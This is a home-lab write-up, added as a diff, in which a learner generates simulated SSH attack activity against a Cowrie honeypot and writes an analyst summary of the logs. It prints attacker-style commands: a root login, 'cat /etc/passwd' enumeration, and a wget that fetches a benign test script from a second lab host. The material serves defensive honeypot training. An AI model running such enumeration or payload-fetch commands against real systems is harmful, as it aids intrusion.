@@ -1,0 +1,106 @@
+cowrie-lab3-enumeration-log-analysis
+
+Overview
+
+I generated SSH attack activity against a Cowrie honeypot, specifically a wget command on a test shell script, reviewed authentication attempts, command logs, and session data, then wrote an analyst report describing attacker behavior.
+
+---
+
+Objectives
+
+1. Turn Cowrie logs into an analyst-style incident summary...
+	
+By the end, I should be able to answer:
+
+2. Who connected?
+3. What username/password did they try?
+4. Did they log in successfully?
+5. What commands did they run?
+6. What files did they try to download?
+7. What does this behavior suggest?
+8. What evidence supports your conclusion?
+
+---
+
+Lab Environment
+
+| Component | Details |
+|---|---|
+| Hypervisor | Proxmox VE |
+| Attacker Machine | Kali Linux |
+| Target Machine | Cowrie Honeypot |
+| Network | Local LAN / Isolated lab network |
+| Tools Used | SSH, Cowrie, Linux CLI, wget |
+
+---
+
+Network Diagram
+
+---
+Cowrie Lab #3 Attacker Log Analysis
+Step 1 - Confim Status
+	cd /home/cowrie/cowrie
+	cowrie-env/bin/cowrie status
+		cowrie is running
+
+Step 2 - Check Listening Port
+	ss -tulnp
+		:2222
+		
+Step 3 SSH from Kali to Cowrie
+	ssh root@192.168.0.104 -p 2222
+		password: 12345
+a. Popped a fake shell
+b. Poked around using: whoami, id, uname -a, pwd, ls, cat /etc/passwd, ip a, wget
+c. Watched logs live: cd /home/cowrie/cowrie; tail -f var/log/cowrie/cowrie.log
+d. created a fake payload
+	mkdir ~/cowrie-payload-test
+	cd ~/cowrie-payload-test
+	echo '#!/bin/bash' > payload.sh
+	echo 'echo "This is a harmless Cowrie test payload."' >> payload.sh
+	python3 -m http.server 8000
+e. wget http://192.168.0.140:8000/payload.sh
+
+RESULT: A simulated attacker attempted to download a file from 192.168.0.140 using wget. The download failed, but the command still indicates possible post-compromise 			
+	payload staging behavior.
+
+Step 4 - Log analysis
+	cd /home/cowrie/cowrie
+	tail -n 20 var/log/cowrie/cowrie.json
+---
+
+Screenshots of logs
+
+---
+
+Cowrie Lab #3 Reflection
+
+In this lab, I connected to the Cowrie honeypot from Kali and generated simulated attacker behavior. I tested login activity, ran basic enumeration commands, and attempted to download a file using wget.
+
+The wget command failed with a temporary name resolution error inside the Cowrie fake shell. However, this is still useful evidence because Cowrie captured the command that was typed. In a real SOC investigation, failed commands can still show attacker intent.
+
+The activity suggests post-login enumeration and possible payload staging behavior. The attacker attempted to interact with the system, inspect the environment, and download a script from another host.
+
+Key takeaway: Honeypot analysis is not just about successful attacks. Failed commands, login attempts, and repeated patterns can all help an analyst understand attacker behavior.	
+
+---
+
+Finding: Simulated Payload Download Attempt
+
+A command was observed where the user attempted to download a shell script using wget:
+
+wget http://192.168.0.140:8000/payload.sh
+
+Although the download failed, this behavior is suspicious because attackers often use wget or curl after gaining shell access to retrieve malware, scripts, or additional tooling. This event indicates possible post-compromise payload staging behavior.
+	
+Analyst Summary
+
+In this lab, I connected to the Cowrie honeypot from Kali/netrun and generated simulated attacker behavior. I tested login activity, ran basic enumeration commands, and attempted to download a file using wget.
+
+The wget command failed with a temporary name resolution error inside the Cowrie fake shell. However, this was still useful evidence because Cowrie captured the command that was typed. In a real SOC investigation, failed commands can still show attacker intent.
+
+The activity suggests post-login enumeration and possible payload staging behavior. The user attempted to interact with the system, inspect the environment, and download a script from another host.
+
+
+
+
